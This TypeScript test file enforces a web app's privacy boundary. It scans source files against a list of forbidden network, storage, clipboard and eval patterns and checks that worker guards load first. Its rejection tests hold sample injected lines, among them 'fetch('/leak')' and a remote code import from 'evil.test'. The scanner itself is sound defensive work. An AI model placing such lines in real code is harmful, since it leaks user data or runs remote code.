import { readdir, readFile } from "node:fs/promises";
import path from "node:path";

import { describe, expect, it } from "vitest";

import { scanPrivacySourceFile } from "../../scripts/privacy-manifest-core.mjs";
import {
  forbiddenOperationWorkerGlobals,
  installOperationWorkerPrivacyGuards,
} from "../../src/operations/privacy-guard";
import { exportWorkflowRecipeCanonical } from "../../src/workflows/recipe-codec";
import { workflowTemplates } from "../../src/workflows/templates";

const forbiddenPrimitives = [
  ["fetch", /\bfetch\s*\(/u],
  ["XMLHttpRequest", /\bXMLHttpRequest\b/u],
  ["WebSocket", /\bWebSocket\b/u],
  ["EventSource", /\bEventSource\b/u],
  ["WebTransport", /\bWebTransport\b/u],
  ["RTCPeerConnection", /\bRTCPeerConnection\b/u],
  ["SharedWorker", /\bSharedWorker\b/u],
  ["BroadcastChannel", /\bBroadcastChannel\b/u],
  ["importScripts", /\bimportScripts\s*\(/u],
  ["sendBeacon", /\bsendBeacon\s*\(/u],
  ["localStorage", /\blocalStorage\b/u],
  ["sessionStorage", /\bsessionStorage\b/u],
  ["IndexedDB", /\bindexedDB\b/u],
  ["Cache Storage", /\bcaches\s*\.\s*(?:open|match|put|delete|keys)\s*\(/u],
  ["document.cookie", /\bdocument\s*\.\s*cookie\b/u],
  ["history mutation", /\bhistory\s*\.\s*(?:pushState|replaceState)\s*\(/u],
  ["clipboard", /\bclipboard\s*\./u],
  ["eval", /\beval\s*\(/u],
  ["Function constructor", /\bnew\s+Function\s*\(/u],
  ["remote dynamic import", /\bimport\s*\(\s*["'](?:https?:|\/\/)/u],
] as const;

async function localRuntimeSourceFiles(): Promise<string[]> {
  const files: string[] = [];

  async function visit(directory: string): Promise<void> {
    for (const entry of await readdir(directory, { withFileTypes: true })) {
      const entryPath = path.join(directory, entry.name);
      if (entry.isDirectory()) {
        await visit(entryPath);
      } else if (
        entry.isFile() &&
        entry.name.endsWith(".ts") &&
        entry.name !== "privacy-guard.ts"
      ) {
        files.push(entryPath);
      }
    }
  }

  await visit(path.resolve("src/operations"));
  await visit(path.resolve("src/tools"));
  await visit(path.resolve("src/workflows"));
  files.push(path.resolve("src/workers/operation.worker.ts"));
  files.push(path.resolve("src/workers/image-compressor.worker.ts"));
  files.push(path.resolve("src/workers/regex-tester.worker.ts"));
  files.push(
    path.resolve("src/lib/operation-runtime-probe.ts"),
    path.resolve("src/lib/workflow-runtime-probe.ts"),
  );
  files.push(
    path.resolve("node_modules/@upng/upng-js/dist/UPNG.esm.js"),
    path.resolve("node_modules/pako/dist/pako.esm.mjs"),
  );
  return files.sort();
}

async function workflowUiSourceFiles(): Promise<string[]> {
  const directory = path.resolve("src/components/workflows");
  return (await readdir(directory, { withFileTypes: true }))
    .filter(
      (entry) =>
        entry.isFile() &&
        (entry.name.endsWith(".ts") || entry.name.endsWith(".tsx")),
    )
    .map((entry) => path.join(directory, entry.name))
    .sort();
}

async function toolUiSourceFiles(): Promise<string[]> {
  const directory = path.resolve("src/components/tools");
  return (await readdir(directory, { withFileTypes: true }))
    .filter(
      (entry) =>
        entry.isFile() &&
        (entry.name.endsWith(".ts") || entry.name.endsWith(".tsx")),
    )
    .map((entry) => path.join(directory, entry.name))
    .sort();
}

describe("operation privacy boundary", () => {
  it("installs fail-closed guards before adapters can reach browser capabilities", () => {
    const target = {};
    installOperationWorkerPrivacyGuards(target);

    expect(forbiddenOperationWorkerGlobals).toEqual(
      expect.arrayContaining([
        "fetch",
        "WebSocket",
        "navigator",
        "indexedDB",
        "caches",
        "Worker",
      ]),
    );
    for (const name of forbiddenOperationWorkerGlobals) {
      expect(() => Reflect.get(target, name)).toThrow(
        expect.objectContaining({
          name: "OperationError",
          code: "execution-failed",
        }),
      );
    }

    expect(() => installOperationWorkerPrivacyGuards(target)).not.toThrow();
    expect(() =>
      installOperationWorkerPrivacyGuards(
        Object.defineProperty({}, "fetch", {
          configurable: false,
          value: () => undefined,
        }),
      ),
    ).toThrow(
      expect.objectContaining({
        name: "OperationError",
        code: "unsupported-environment",
      }),
    );

    const absentTarget = Object.defineProperty({}, "fetch", {
      configurable: false,
      writable: false,
      value: undefined,
    });
    expect(() =>
      installOperationWorkerPrivacyGuards(absentTarget),
    ).not.toThrow();

    const writableUndefinedTarget = Object.defineProperty({}, "fetch", {
      configurable: false,
      writable: true,
      value: undefined,
    });
    expect(() =>
      installOperationWorkerPrivacyGuards(writableUndefinedTarget),
    ).toThrow(
      expect.objectContaining({
        name: "OperationError",
        code: "unsupported-environment",
      }),
    );
  });

  it("scans every production source file with a closed capability allowlist", async () => {
    const sourceRoot = path.resolve("src");
    const files: string[] = [];
    const visit = async (directory: string): Promise<void> => {
      for (const entry of await readdir(directory, { withFileTypes: true })) {
        const entryPath = path.join(directory, entry.name);
        if (entry.isDirectory()) await visit(entryPath);
        else if (
          entry.isFile() &&
          /\.(?:astro|[cm]?[jt]sx?)$/u.test(entry.name) &&
          !entry.name.endsWith(".d.ts")
        ) {
          files.push(entryPath);
        }
      }
    };
    await visit(sourceRoot);

    const issues: string[] = [];
    for (const file of files) {
      issues.push(
        ...scanPrivacySourceFile(
          path.relative(process.cwd(), file),
          await readFile(file, "utf8"),
        ),
      );
    }
    expect(issues).toEqual([]);
  });

  it.each([
    ["network", "fetch('/leak')"],
    ["persistence", "localStorage.setItem('payload', secret)"],
    ["clipboard read", "navigator.clipboard.readText()"],
    ["remote code", "import('https://evil.test/runtime.js')"],
    ["template interpolation", "const value = `safe ${fetch('/leak')}`"],
  ])("rejects injected %s capability use", (_name, source) => {
    expect(
      scanPrivacySourceFile("src/components/Injected.tsx", source),
    ).not.toEqual([]);
  });

  it("keeps the serializable catalog isolated from adapter and tool code", async () => {
    const catalog = await readFile(
      path.resolve("src/operations/catalog.ts"),
      "utf8",
    );
    const runtimeRegistry = await readFile(
      path.resolve("src/operations/runtime-registry.ts"),
      "utf8",
    );

    expect(catalog).not.toMatch(
      /(?:from|import\s*\()\s*["'][^"']*(?:adapters|tools)\//u,
    );
    expect(runtimeRegistry).not.toMatch(
      /\bimport\s+[^;(]+\s+from\s+["'][^"']*adapters\//u,
    );
    expect(
      runtimeRegistry.match(/\bimport\s*\(\s*["']\.\/adapters\//gu),
    ).toHaveLength(13);
  });

  it("keeps Operations and workflow runtime code free of network and persistence APIs", async () => {
    const violations: string[] = [];

    for (const file of await localRuntimeSourceFiles()) {
      const source = await readFile(file, "utf8");
      const relativePath = path.relative(process.cwd(), file);

      for (const [name, pattern] of forbiddenPrimitives) {
        if (pattern.test(source)) violations.push(`${relativePath}: ${name}`);
      }
    }

    expect(violations).toEqual([]);
  });

  it("keeps Workflow Studio free of network, persistence and automatic clipboard reads", async () => {
    const violations: string[] = [];
    const uiForbiddenPrimitives = [
      ...forbiddenPrimitives.filter(([name]) => name !== "clipboard"),
      ["clipboard read", /\bclipboard\s*\.\s*(?:read|readText)\s*\(/u] as const,
      ["console payload logging", /\bconsole\s*\./u] as const,
    ];

    for (const file of await workflowUiSourceFiles()) {
      const source = await readFile(file, "utf8");
      const relativePath = path.relative(process.cwd(), file);
      for (const [name, pattern] of uiForbiddenPrimitives) {
        if (pattern.test(source)) violations.push(`${relativePath}: ${name}`);
      }
    }

    expect(violations).toEqual([]);
  });

  it("keeps tool UI free of network, persistence and automatic clipboard reads", async () => {
    const violations: string[] = [];
    const uiForbiddenPrimitives = [
      ...forbiddenPrimitives.filter(([name]) => name !== "clipboard"),
      ["clipboard read", /\bclipboard\s*\.\s*(?:read|readText)\s*\(/u] as const,
      ["console payload logging", /\bconsole\s*\./u] as const,
    ];

    for (const file of await toolUiSourceFiles()) {
      const source = await readFile(file, "utf8");
      const relativePath = path.relative(process.cwd(), file);
      for (const [name, pattern] of uiForbiddenPrimitives) {
        if (pattern.test(source)) violations.push(`${relativePath}: ${name}`);
      }
    }

    expect(violations).toEqual([]);
  });

  it("installs Worker privacy guards before loading every runtime implementation", async () => {
    const operationWorker = await readFile(
      path.resolve("src/workers/operation.worker.ts"),
      "utf8",
    );
    const imageWorker = await readFile(
      path.resolve("src/workers/image-compressor.worker.ts"),
      "utf8",
    );
    const regexWorker = await readFile(
      path.resolve("src/workers/regex-tester.worker.ts"),
      "utf8",
    );

    for (const source of [operationWorker, imageWorker, regexWorker]) {
      const guard = source.indexOf(
        "installOperationWorkerPrivacyGuards(globalThis)",
      );
      expect(guard).toBeGreaterThanOrEqual(0);
      expect(source).not.toMatch(/import\s+\{\s*encodeRgbaToPng\s*\}\s+from/u);
    }
    expect(imageWorker.indexOf("await import(")).toBeGreaterThan(
      imageWorker.indexOf("installOperationWorkerPrivacyGuards(globalThis)"),
    );
    expect(regexWorker.indexOf("await import(")).toBeGreaterThan(
      regexWorker.indexOf("installOperationWorkerPrivacyGuards(globalThis)"),
    );
    expect(
      operationWorker.indexOf("loadOperationDefinition(manifest.id)"),
    ).toBeGreaterThan(
      operationWorker.indexOf(
        "installOperationWorkerPrivacyGuards(globalThis)",
      ),
    );
  });

  it("keeps the regex UI isolated from the shared Operation executor", async () => {
    const tool = await readFile(
      path.resolve("src/components/tools/RegexTesterTool.tsx"),
      "utf8",
    );
    const client = await readFile(
      path.resolve("src/tools/regex-tester/worker-client.ts"),
      "utf8",
    );

    expect(tool).not.toMatch(/OperationExecutor|operations\/executor/u);
    expect(tool).not.toMatch(/from\s+["']\.\.\/\.\.\/tools\/regex-tester["']/u);
    expect(client).toContain("regex-tester.worker.ts");
    expect(client).toContain("worker.terminate()");
    expect(client).not.toMatch(/OperationExecutor|operations\/executor/u);
  });

  it("exports template recipes without payload, result or runtime fields", () => {
    for (const template of workflowTemplates) {
      const exported = exportWorkflowRecipeCanonical(template.recipe);
      const recipe = JSON.parse(exported) as Record<string, unknown>;

      expect(Object.keys(recipe)).toEqual(["format", "version", "steps"]);
      expect(exported).not.toMatch(
        /"(?:payload|input|output|result|status|vaultId|fileName|contentHash)"\s*:/u,
      );
      for (const step of recipe.steps as Array<Record<string, unknown>>) {
        expect(Object.keys(step)).toEqual(["operationId", "options"]);
      }
    }
  });
});
